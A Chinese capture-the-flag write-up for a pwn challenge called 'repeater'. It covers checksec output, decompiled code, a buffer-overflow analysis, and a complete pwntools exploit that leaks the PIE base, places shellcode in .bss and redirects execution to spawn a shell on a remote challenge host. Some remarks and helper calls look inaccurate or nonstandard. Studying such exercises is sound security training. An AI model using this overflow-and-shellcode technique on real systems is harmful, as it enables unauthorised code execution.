#### repeater

1. checksec，如下：

   ```bash
   └─# checksec repeater   
   [*] '/home/kali/Cpp_Test/no_problem/repeater'
       Arch:     amd64-64-little
       RELRO:    Full RELRO
       Stack:    No canary found
       NX:       NX disabled
       PIE:      PIE enabled
       RWX:      Has RWX segments
   ```

   堆栈地址随机化全开，地址空间布局随机化开启
2. ida分析：

   ```c
   __int64 __fastcall main(__int64 a1, char **a2, char **a3)
   {
     char s[32]; // [rsp+0h] [rbp-30h] BYREF
     int v5; // [rsp+20h] [rbp-10h]
     int i; // [rsp+2Ch] [rbp-4h]

     sub_91B(a1, a2, a3);
     sub_A08();
     v5 = 1192227;
     puts("I can repeat your input.......");
     puts("Please give me your name :");
     memset(byte_202040, 0, sizeof(byte_202040));
     sub_982(byte_202040, 48LL);
     for ( i = 0; i < v5; ++i )
     {
       printf("%s's input :", byte_202040);
       memset(s, 0, sizeof(s));
       read(0, s, 0x40uLL);
       puts("sorry... I can't.....");
       if ( v5 == 3281697 )
       {
         puts("But there is gift for you :");
         printf("%p\n", main);
       }
     }
     return 0LL;
   }
   ```

   查看函数列表，没有后门函数，我们需要写入shellcode
3. `sub_982(byte_202040, 48LL);`被调用，将输入的内容写入bss段，附加段，偏移量不变化，可以在此写入shellcode

   可以看到 `read(0, s, 0x40uLL);`存在溢出，v5,i两变量在s之后， 可以被覆盖，利用此跳出循环

   read可以覆盖掉最多超出栈16个字节。

   main最后执行的两条语句为

   `pop rbp，pop rip`

   故我们恰好可以控制rip实现任意跳转

   `printf("%p\n", main);`如果可以控制v5的值就可以获取main的地址，偏移量为A33，PIE基址为main_addr-A33，bss段为

   `main_addr-A33+0x202040`

**payload**：

```python
from pwn import *
from pwn_p64 import *

context(os='linux', arch='amd64', log_level='debug')
# context是pwntools用来设置环境的功能。在很多时候，由于二进制文件的情况不同，我们可能需要进行一些环境设置才能够正常运行exp，比如有一些需要进行汇编，但是32的汇编和64的汇编不同，如果不设置context会导致一些问题。

io = remote("61.147.171.105", 57809)
shellcode = asm(shellcraft.sh())
io.sendlineafter("Please give me your name :", shellcode)
# 利用shellcraft模块生成shellcode，将其写入bss段，0x202040

payload = b"a" * 0x20 + p32(3281697, "ord")
io.sendlineafter("input :", payload)
# 覆盖变量v5，获取main函数地址

io.readuntil(b'But there is gift for you :\n')
main_addr = int(io.recvuntil("\n"), 16)
base_addr = main_addr - 0xA33
# 得到PIE基址

final_payload = b'a' * 0x20 + p32(0, "ord") + p32(0, "ord") + p64(0, "ord") + p64(0, "ord") + p64(base_addr + 0x202040, 'hex')
# b'a' * 0x20 覆盖字符数组char s[32]
# p32(0, "ord")覆盖v5
# p32(0, "ord")覆盖i
# p64(0, "ord")栈是0x30字节还剩0x08字节没覆盖，再覆盖0x08字节，
# p64(0, "ord")最后有一个leave指令恢复旧的栈帧，相当于mov rsp,rbp；pop rbp；，pop rbp之后还要rsp+0x08，再覆盖0x08字节
# p64(base_addr + 0x202040, 'hex')接下来的八字节才是函数返回的地址，使此地址位填写的shellcode指令的地址，PIE基址加偏移量0x202040，编码发送

io.sendlineafter("input :", final_payload)
io.interactive()
```
